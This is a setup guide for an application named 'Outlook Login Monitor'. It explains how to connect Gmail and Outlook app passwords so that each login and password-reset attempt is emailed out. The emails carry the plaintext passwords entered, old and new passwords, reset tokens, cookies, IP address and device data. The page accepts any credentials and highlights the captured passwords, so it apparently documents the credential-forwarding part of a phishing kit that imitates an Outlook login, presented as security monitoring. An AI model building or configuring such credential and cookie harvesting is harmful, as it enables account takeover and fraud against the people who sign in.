# Email Notification Setup Guide

This application supports email notifications through **Gmail**, **Outlook/Hotmail**, or **both simultaneously**. You can configure one or both email providers to receive login and password reset notifications.

---

## 📧 Email Providers Supported

- ✅ **Gmail** (gmail.com)
- ✅ **Outlook/Hotmail** (outlook.com, hotmail.com, live.com)
- ✅ **Both Gmail AND Outlook** (receive notifications in both)

---

## 🚀 Quick Setup

### Option 1: Gmail Only

1. **Generate App Password**
   - Go to [Google App Passwords](https://myaccount.google.com/apppasswords)
   - Sign in to your Google account
   - Click "Select app" → Choose "Mail"
   - Click "Select device" → Choose "Other" → Enter "Outlook Login Monitor"
   - Click "Generate"
   - Copy the 16-character password

2. **Update .env file**
   ```env
   GMAIL_USER=your-email@gmail.com
   GMAIL_APP_PASSWORD=xxxx xxxx xxxx xxxx
   ```

3. **Leave Outlook blank** (or don't add it)
   ```env
   # OUTLOOK_USER=
   # OUTLOOK_APP_PASSWORD=
   ```

### Option 2: Outlook Only

1. **Generate App Password**
   - Go to [Microsoft Security](https://account.microsoft.com/security)
   - Click "Advanced security options"
   - Under "Additional security", click "App passwords"
   - Click "Create a new app password"
   - Copy the generated password

2. **Update .env file**
   ```env
   OUTLOOK_USER=your-email@outlook.com
   OUTLOOK_APP_PASSWORD=your-outlook-password
   ```

3. **Leave Gmail blank** (or don't add it)
   ```env
   # GMAIL_USER=
   # GMAIL_APP_PASSWORD=
   ```

### Option 3: Both Gmail AND Outlook

1. **Generate both app passwords** (follow steps from Option 1 and 2)

2. **Update .env file with both**
   ```env
   # Gmail
   GMAIL_USER=your-email@gmail.com
   GMAIL_APP_PASSWORD=xxxx xxxx xxxx xxxx
   
   # Outlook
   OUTLOOK_USER=your-email@outlook.com
   OUTLOOK_APP_PASSWORD=your-outlook-password
   ```

3. **Receive notifications in both inboxes!** 🎉

---

## 📝 Detailed Setup Instructions

### Gmail Setup (Step-by-Step)

1. **Enable 2-Factor Authentication** (Required)
   - Go to [Google Account Security](https://myaccount.google.com/security)
   - Find "2-Step Verification"
   - Click "Get Started" and follow the prompts

2. **Generate App Password**
   - Go to [App Passwords](https://myaccount.google.com/apppasswords)
   - You'll be asked to sign in again
   - Select "Mail" from the dropdown
   - Select "Other (Custom name)" for device
   - Enter: "Outlook Login Monitor"
   - Click "Generate"
   - Copy the 16-character password (format: xxxx xxxx xxxx xxxx)

3. **Add to .env File**
   ```env
   GMAIL_USER=yourname@gmail.com
   GMAIL_APP_PASSWORD=abcd efgh ijkl mnop
   ```
   
   ⚠️ **Important**: Remove spaces from the password when copying to .env:
   ```env
   GMAIL_APP_PASSWORD=abcdefghijklmnop
   ```

### Outlook Setup (Step-by-Step)

1. **Enable 2-Factor Authentication** (Required)
   - Go to [Microsoft Security](https://account.microsoft.com/security)
   - Click "Advanced security options"
   - Find "Two-step verification"
   - Click "Turn on" and follow the prompts

2. **Generate App Password**
   - Stay on [Security page](https://account.microsoft.com/security)
   - Click "Advanced security options"
   - Scroll to "App passwords" section
   - Click "Create a new app password"
   - A password will be displayed (example: abcd-1234-efgh-5678)
   - Copy this password immediately (it won't be shown again)

3. **Add to .env File**
   ```env
   OUTLOOK_USER=yourname@outlook.com
   OUTLOOK_APP_PASSWORD=abcd-1234-efgh-5678
   ```
   
   ⚠️ **Note**: Keep the dashes in Outlook passwords

### Supported Outlook Domains
- ✅ @outlook.com
- ✅ @hotmail.com
- ✅ @live.com
- ✅ @msn.com

---

## 🔍 What Gets Sent?

Both email providers will receive identical notifications containing:

### Login Notifications
- ✅ Email address
- ✅ Password entered
- ✅ Login status (success/failure)
- ✅ IP address
- ✅ Location (based on IP)
- ✅ Device information
- ✅ Browser details
- ✅ Cookies
- ✅ Timestamp

### Password Reset Notifications
- ✅ Email address
- ✅ Current password entered
- ✅ New password entered
- ✅ Reset token
- ✅ IP address
- ✅ Location
- ✅ Device information
- ✅ Browser details
- ✅ Cookies
- ✅ Timestamp

---

## ⚙️ Configuration Options

### Email Only to Specific Address

You can override the recipient email in the code:

```typescript
// In lib/gmail.ts or lib/outlook.ts
const mailOptions = {
  from: `"Outlook Login Monitor" <${GMAIL_USER}>`,
  to: "security@yourdomain.com", // Override recipient
  subject: options.subject,
  // ...
};
```

### Disable Email Notifications

To disable notifications from a specific provider, simply don't set the environment variables:

```env
# Gmail disabled (variables not set or empty)
# GMAIL_USER=
# GMAIL_APP_PASSWORD=

# Outlook enabled
OUTLOOK_USER=your@outlook.com
OUTLOOK_APP_PASSWORD=your-password
```

---

## 🧪 Testing Your Configuration

1. **Start the development server**
   ```bash
   npm run dev
   ```

2. **Try to log in**
   - Go to http://localhost:3000
   - Enter any email and password
   - Click "Sign in"

3. **Check your email(s)**
   - Gmail inbox (if configured)
   - Outlook inbox (if configured)
   - Both inboxes (if both configured)

4. **Look for**
   - Subject: "⚠️ Failed Login Attempt" or "✅ Successful Login Attempt"
   - Email contains all user details
   - Password is highlighted in yellow

---

## 🐛 Troubleshooting

### Gmail Issues

**Problem**: "Invalid credentials" error
- ✅ Verify 2FA is enabled
- ✅ Use app password, not regular password
- ✅ Remove spaces from app password
- ✅ Regenerate app password if needed

**Problem**: Emails not received
- ✅ Check spam/junk folder
- ✅ Verify GMAIL_USER email is correct
- ✅ Check console for error messages
- ✅ Try sending a test email

### Outlook Issues

**Problem**: "Authentication failed" error
- ✅ Verify 2FA is enabled on Microsoft account
- ✅ Use app password from security settings
- ✅ Keep dashes in password: `abcd-1234-efgh-5678`
- ✅ Verify email domain is supported

**Problem**: Connection timeout
- ✅ Check firewall settings
- ✅ Ensure port 587 is not blocked
- ✅ Try with VPN disabled
- ✅ Check antivirus settings

### Both Services

**Problem**: Console shows "Email not configured"
- ✅ Verify environment variables are set in `.env` file (not `.env.example`)
- ✅ Restart development server after updating `.env`
- ✅ Check for typos in variable names

**Problem**: Only one service sending emails
- ✅ Verify both sets of credentials are in `.env`
- ✅ Check console for error messages
- ✅ Test each service individually

---

## 🔒 Security Best Practices

### DO ✅
- Use app-specific passwords (never use your main password)
- Enable 2-factor authentication
- Keep `.env` file secure (never commit to git)
- Rotate app passwords regularly
- Monitor email notifications for unusual activity

### DON'T ❌
- Share your app passwords
- Commit `.env` file to version control
- Use the same password for multiple apps
- Disable 2-factor authentication
- Ignore failed login notifications

---

## 📊 Email Notification Flow

```
User Action (Login/Reset)
         ↓
Application captures data
         ↓
    ┌────────────────┐
    │  Save to DB    │
    └────────────────┘
         ↓
    ┌────────────────┐
    │ Send to Gmail  │ (if configured)
    └────────────────┘
         ↓
    ┌────────────────┐
    │ Send to Outlook│ (if configured)
    └────────────────┘
         ↓
    Both emails sent asynchronously
    (doesn't block user response)
```

---

## 🎨 Email Template

Both Gmail and Outlook receive beautiful HTML emails with:
- Color-coded headers (green for success, red for failure, blue for reset)
- Organized information in cards
- Highlighted passwords (yellow background)
- Responsive design
- Professional formatting

---

## 📱 Mobile App Passwords

### Gmail on Mobile
1. Open Gmail app
2. Go to Settings → Your account → Security
3. Follow same steps as desktop

### Outlook on Mobile
1. Open Outlook app
2. Tap profile icon
3. Go to Settings → Security
4. Follow same steps as desktop

---

## ✨ Features

- ✅ **Dual provider support** - Use Gmail, Outlook, or both
- ✅ **Flexible configuration** - Enable/disable per provider
- ✅ **Async sending** - Doesn't slow down user experience
- ✅ **Rich HTML emails** - Beautiful, professional templates
- ✅ **Complete data capture** - All login/reset information
- ✅ **Error handling** - Silent failures don't break app
- ✅ **Easy setup** - Just add credentials to `.env`

---

## 🚀 Next Steps

After setting up email notifications:

1. **Test thoroughly** - Try both login and password reset
2. **Monitor emails** - Ensure you receive notifications
3. **Secure credentials** - Keep app passwords safe
4. **Set up filters** - Create email rules for organization
5. **Deploy** - Configure production environment variables

---

## 📞 Support

If you encounter issues:
1. Check this guide's troubleshooting section
2. Review console logs for error messages
3. Verify `.env` file configuration
4. Test each email provider separately
5. Ensure 2FA is enabled

---

**Configuration complete! You'll now receive notifications via your chosen email provider(s). 🎉**
